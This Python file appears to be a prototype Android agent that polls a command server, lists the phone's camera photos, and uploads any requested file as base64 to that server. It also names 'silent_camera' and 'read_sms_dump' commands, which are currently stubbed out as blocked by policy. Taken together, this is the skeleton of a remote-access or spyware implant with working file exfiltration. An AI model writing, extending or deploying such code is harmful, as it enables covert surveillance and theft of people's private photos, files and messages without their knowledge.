import asyncio
from pathlib import Path
from typing import Any
import time
import json
import base64

import aiohttp


class AgentLogic:
    def __init__(self):
        self.api_base = "http://127.0.0.1:8000"
        self.agent_id = "android-agent-001"
        self.token = "dev-token-1"
        self.camera_dir = Path("/storage/emulated/0/DCIM/Camera")

    def _headers(self) -> dict[str, str]:
        return {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json",
            "X-Agent-ID": self.agent_id,
        }

    async def _post_result(self, session: aiohttp.ClientSession, command_id: str, status: str, result: dict[str, Any]) -> None:
        url = f"{self.api_base}/agents/{self.agent_id}/commands/{command_id}:complete"
        payload = {"status": status, "result": result}
        async with session.post(url, headers=self._headers(), json=payload) as response:
            response.raise_for_status()

    async def _telemetry(self, session: aiohttp.ClientSession, event_type: str, data: dict[str, Any]) -> None:
        url = f"{self.api_base}/agents/{self.agent_id}/telemetry:ingest"
        payload = {
            "events": [
                {
                    "ts": int(time.time()),
                    "event_type": event_type,
                    "data": data,
                }
            ]
        }
        async with session.post(url, headers=self._headers(), json=payload) as response:
            response.raise_for_status()

    async def _pull_commands(self, session: aiohttp.ClientSession) -> list[dict[str, Any]]:
        url = f"{self.api_base}/agents/{self.agent_id}/commands:pull"
        async with session.get(url, headers=self._headers()) as response:
            response.raise_for_status()
            body = await response.json()
            return body.get("commands", [])

    def _gallery_list(self) -> list[dict[str, Any]]:
        if not self.camera_dir.exists():
            return []
        items: list[dict[str, Any]] = []
        for path in sorted(self.camera_dir.glob("*"), key=lambda p: p.stat().st_mtime, reverse=True):
            if path.is_file():
                stat = path.stat()
                items.append(
                    {
                        "name": path.name,
                        "path": str(path),
                        "size": stat.st_size,
                        "mtime": int(stat.st_mtime),
                    }
                )
        return items

    def _read_file(self, file_path: str) -> bytes:
        path = Path(file_path)
        if not path.is_file():
            raise FileNotFoundError(file_path)
        data = path.read_bytes()
        if len(data) > 8 * 1024 * 1024:
            raise ValueError("file too large")
        return data

    async def _handle_payload(self, session: aiohttp.ClientSession, payload: dict[str, Any]) -> dict[str, Any]:
        name = payload.get("name")
        args = payload.get("args", {})

        if name in {"health.ping", "health"}:
            return {"ok": True, "ts": int(time.time())}

        if name == "get_gallery_list":
            return {"files": self._gallery_list()}

        if name == "upload_file":
            target = args.get("path")
            if not target:
                raise ValueError("missing args.path")
            raw = self._read_file(target)
            await self._telemetry(
                session,
                "file.upload",
                {
                    "name": Path(target).name,
                    "path": target,
                    "size": len(raw),
                    "content_b64": base64.b64encode(raw).decode("ascii"),
                },
            )
            return {"ok": True, "path": target, "size": len(raw)}

        if name in {"silent_camera", "read_sms_dump"}:
            return {"ok": False, "error": "blocked_by_policy"}

        return {"ok": False, "error": f"unknown_command:{name}"}

    async def run_once(self) -> None:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            commands = await self._pull_commands(session)
            for record in commands:
                command_id = record.get("id")
                payload = record.get("payload", {})
                if not command_id:
                    continue
                try:
                    result = await self._handle_payload(session, payload)
                    await self._post_result(session, command_id, "success", result)
                except Exception as exc:
                    await self._post_result(session, command_id, "error", {"error": str(exc)})


if __name__ == "__main__":
    async def _main():
        agent = AgentLogic()
        while True:
            await agent.run_once()
            await asyncio.sleep(10)

    asyncio.run(_main())
